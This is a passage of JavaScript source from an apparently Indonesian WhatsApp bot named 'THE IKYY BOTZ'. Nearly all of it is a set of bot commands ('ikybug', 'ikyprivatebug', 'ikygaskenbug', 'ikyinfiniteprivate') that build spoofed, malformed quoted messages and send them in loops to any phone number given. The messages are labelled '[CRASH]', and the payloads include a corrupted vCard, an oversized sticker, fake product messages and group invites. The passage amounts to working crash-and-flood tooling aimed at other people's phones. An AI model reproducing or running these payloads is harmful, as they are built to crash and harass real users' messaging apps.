ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'ikyprivatebug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc})
await m.reply(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'ikygaskenbug5':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let floc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `By: 𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:floc1})
jancok(`Berhasil Mengirim Bug5 Di Nomer ${text}`)
break 
case 'ikybug6':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"description": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"description": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}	
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko})
await m.reply(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'ikygaskenbug6':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let ftoko1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"description": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:ftoko1})
jancok(`Berhasil Mengirim Bug6 Di Nomer ${text}`)
break
case 'ikybug7':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid})
await m.reply(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'ikygaskenbug7':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let foncevid1 = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foncevid1})
jancok(`Berhasil Mengirim Bug7 Di Nomer ${text}`)
break
case 'ikybug8':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg})}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg})
await m.reply(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'ikygaskenbug8':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fonceimg1 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fonceimg1})
jancok(`Berhasil Mengirim Bug8 Di Nomer ${text}`)
break
case 'ikybug9':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc})
await m.reply(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'ikygaskenbug9':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fgc1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
 ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fgc1})
jancok(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
break
case 'ikybug10':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic})
 }
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
case 'ikyprivatebug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic})
 await m.reply(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
case 'ikygaskenbug10':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let stic1 = { 
"key": {
"participant": `6285706035039@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic1})
 ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:stic1})
 jancok(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
 break
//Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
case 'ikybug11':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break 
case 'ikyprivatebug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon})
await m.reply(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'ikygaskenbug11':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let fkon1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
 ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fkon1})
jancok(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
break 
case 'ikybug12':
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Ikyy`
for (let i = 0; i < jumlah; i++) { 
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv})
}
jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case 'ikyprivatebug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv})
await m.reply(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break
case 'ikygaskenbug12':
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let finv1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
"caption": `𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]`, 
'jpegThumbnail': virgam
}
}
}
ikycoli.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv1})
ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:finv1})
jancok(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
break

  case 'ikyinfiniteprivate':               
   if (!isCreator && !isBan) return
   if (!text) throw `Nomernya mana?`
 ikyenak66 = { 
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" }) 
 }, 
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
 "caption": `IKYY MAKERZ INFINITE`,
 "jpegThumbnail": virgam
 } 
 } 
 }
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
await m.reply(`Berhasil Mengirim Infinite iky Di Nomer ${text}`)
     break

 case 'ikygaskeninfinite': 
          if (!isCreator && !isBan) return
          if (!text) throw `Nomernya mana?`
             ikyenak66 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `IKYY MAKERZ INFINITE`,
                            "jpegThumbnail": virgam
                        } 
                    } 
                }
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(m.chat, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
            await ikycoli.sendMessage(`${text}@s.whatsapp.net`, {text:"IKYY MAKERZ INFINITE"},{quoted:ikyenak66})
